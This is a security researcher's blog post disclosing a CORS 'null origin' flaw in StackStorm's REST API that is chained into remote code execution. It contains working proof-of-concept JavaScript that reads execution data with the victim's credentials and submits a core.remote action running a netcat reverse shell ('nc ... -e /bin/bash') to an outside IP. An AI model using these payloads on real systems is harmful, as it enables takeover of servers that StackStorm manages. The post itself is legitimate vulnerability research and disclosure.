---
layout: post
title: StackStorm - From Originull to RCE
---

<div style="text-align:center"><img src="https://www.thefastmode.com/media/k2/items/src/3cc8012eca57577e33709ae3cf2556ae.jpg"></div><br>StackStorm (aka "IFTTT for Ops") is event-driven automation for auto-remediation, security responses, troubleshooting, deployments, and more.
In this blogpost I will describe how can you cause RCE on targeted servers which only requires an authenticated user browse to malicious webpage.


So first, lets understand what is StackStorm, StackStorm is a really popular (3K stars on github) devops event-driven automation tool, allows devops to configure actions, workflows, and scheduled tasks, in order to perform some operations on large-scale servers.

Actions will run on behalf remote servers managed by StackStorm agent. Those actions can be anything, from HTTP request to an arbitrary command as you can see in the following image:
<div style="text-align:center"><img src="https://lh6.googleusercontent.com/cHgBmUQavZ2tfo98YZzGbZtSqCOVZJrsSXiVrbFE3H9PobrckApM4fRx_ce2R1yFX59Dz5bpUlIAQg-Zh0JDQKZuBI4SqleX8uCczQEi"></div>

Due to the fact that StackStorm agent run those actions on remote servers it will be “blessed” by quite high-privileges. This fact really motivated me to find flaw in it.

I was managed to see this request:
<div style="text-align:center"><img src="https://lh3.googleusercontent.com/gnw0KB9Ii4BH-nR2zIKzHAVEMnJYy68bjO_3rD6uHW_RbZaJACFUQ8m-b_i_pyb3w9p9Hq1uw14VySYCPr31KjE6jazfkf2TzaSVSEa7BrLLWw3zPqvTn9Pzf4_VhGPVh_pMZQBG"></div>

As we can see the “Access-Control-Allow-Origin” header returning in each request to StackStorm REST API, even when request not includes the origin header, quite weird but anyway might make sense…
Then I started to send a malformed Origin header and I realized that the server cant handle it properly, and returning the header “Access-Control-Allow-Origin: null”:
<div style="text-align:center"><img src="https://lh5.googleusercontent.com/iROyOQlB1lRDbcvCOis4P8PkcJb3kcSG8PJCpyiAHjubxJ7tG9JIVu-nS9Vtd3Wo6bZoiQubqBTOP4FS5F7qWveiDXUqvtDkG_2uq-vNyPSITx-nQtB9GdwLbaO-iQtIQfWUYB2D"></div>


Right away I knew that there is something interstring in here, and reminded the [Originull attack discovered by Ysrael Gurt](https://bugsec.com/wp-content/uploads/2016/12/Blog-Post-BugSec-Cynet-Facebook-Originull.pdf)
This is the first time I encountered that on the wild, I was really curious about why is this happening in first place?
why servers returning “Access-Control-Allow-Origin: null” header at all? they can just not return this header at all.
I managed to read a bit the [The Web Origin Concept RFC](https://tools.ietf.org/html/rfc6454) and find page 11 quite interesting related to Originull:
<div style="text-align:center"><img src="https://lh4.googleusercontent.com/MSAecvSRa9BHTCV32M526_aisMdNz2ApU_e5xoZRbf7bv9vkXQTP0rLJlRi3wzEIMg8ZQKj142Mk-v2i1wNAkI_t4hm4xDMxo9rRpLXG8qHjXQJrrgxKFzQF_Lz_tmdV8ym85pUs"></div>


To simplify, the RFC defines, in case the server got a malformed origin which cannot be serialized, set the string “null” as the Origin header.
Now we can understand what is the root cause for all this, that's makes me laugh a bit because the RFC defines one thing, but [Mozilla best practices](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) saying to avoid using it (make sense anyway).

After we understand why is this happening, let’s understand how can we exploit this flaw?
So now the origin “null” have the a “full privileges” to StackStorm REST API, which means, that this origin can fetch requests and read responses on behalf any user that will browse to this “null” origin.
How can I get null origin? Via data/file scheme as shown in the PDF mentioned above.
You can run this in your browse and see that you get empty(document.domain=null) alert message:
```javascript
data:text/html;,<script>alert(document.domain)</script>
```
At the PDF document, they used a meta tag in order to redirect the user to browse this malicious data URL:
```bash
<meta http-equiv="refresh" content="0;URL='data:text/html;,<script>alert(document.domain)</script>'" />  
```

I tried to use the same technique in order have a popup message reading data from StackStorm REST API but I got this message:
<div style="text-align:center"><img src="https://lh6.googleusercontent.com/uxhmHpvw8aMpa9kaVcD8QFj9a6wDgaRXO3VAQRhuvM0ZfEcH1LCEBfSUvxmW0dD7u0_YPYzc5-Yl4jEAt0vKRiNWQQfpkIlszclJBDnHVyeME2kD4E3X4y7s3Rd8T55OYoLucEF7"></div>


Crap! I realized that chrome and firefox disabled any data scheme redirections.
I was needed to get another creative way to redirect users to execute this malicious script on null origin context.
Tried to manipulate redirections responses with data URL schemes on Location header but it failed.
Finally I used “javascript:” scheme, which allows me to execute JS code which runs on the same context as data and file schemes.
So by the javascript scheme I was managed to make a full working PoC as shown below:
```html
<script>	document.location="javascript:fetch('https://172.18.0.6/api/v1/executions',{credentials: 'include'}).then((res)=>{console.log(res.json().then((a) => {console.log(a)}));})"
</script>
```
We can see the REST API response object printed to the console and can be leak to anywhere:
<div style="text-align:center"><img src="https://lh4.googleusercontent.com/e5tZ0o6HXlE4PCu9Ru_EaXQh_7ThnP5BEmGioidAKZqxS6pgW391Ykfd8gt022rE3aNAZeWhMVqgyFlDFg7WldynKB1Ys7R5aNS5qv0G0SqIdKTkzrg4O4JQA9Gx3Yrjx4KaadPp"></div>

So actually, we have to ability to read/update/create actions and workflows, get internal IPs and execute command on each machine which is accessible by StackStorm agent.

It is possible to perform code execution via core.remote action:
```html
<script>
		let jsonBody = {"action":"core.remote","parameters":{"cmd":"nc 192.168.100.113 4444 -e /bin/bash","hosts":"10.0.0.10"},"context":{"trace_context":{}}}
		document.location="javascript:fetch('https://172.18.0.6/api/v1/executions',{credentials: 'include', method: 'post', body: JSON.stringify(jsonBody),headers: {'Content-Type': 'application/json'}}).then((res)=>{console.log(res.json().then((a) => {console.log(a)}));})"
</script>

```
<div style="text-align:center"><img src="https://lh4.googleusercontent.com/N_RVrqFZcfJcZ3AK9DyZnLkAzbMTtdk9A6MTEsiuMIHfik4RADjEZAH3Yt4gB6xIRU6E5gDOmwuXkuK-m4x0kybVeKrrQ6DG23mvF5fJyT7DGFvSNBLidEBsuheYxnmkA8LR2LZ5"></div>

So I was sure I done, but then I tried to run it from a web server, and got the following error message:
<div style="text-align:center"><img src="https://lh5.googleusercontent.com/wyjtRTeOMqk6AtCZ8AWIR8uPXet9us9iRP7S2TeXp1ACU9AGQ_Z2hOlM3r9yFec8tbhgMLWkep9QcNV3JcHrcKnvKMwqHh2CSOmHzlu8V3tY9sSD7-WO8FOhIwQQYgAoODFPDWrY"></div>

I was like, not again!!! The browser actually saves the origin context even if we use javascript, so it was only exploitable via sending a file to the user and make him open it.
I was frustrated and motivated at the same time, and got help from my talented colleague Chen Gur Arie, we managed to bypass this as well, and we got Origin null context from a page loaded in a domain (btw, Flash can do that as well)
I don't want to elaborate about how we did it, because we still trying to figure out what are the implications of it.

Now all an attacker needs is to send a malicious link to a victim which is authenticated to StackStorm Web UI, thus, allow the attacker take over any server accessible by StackStorm agent as you can see at [the PoC video](https://www.youtube.com/watch?v=KnvWCg2Q7k4)
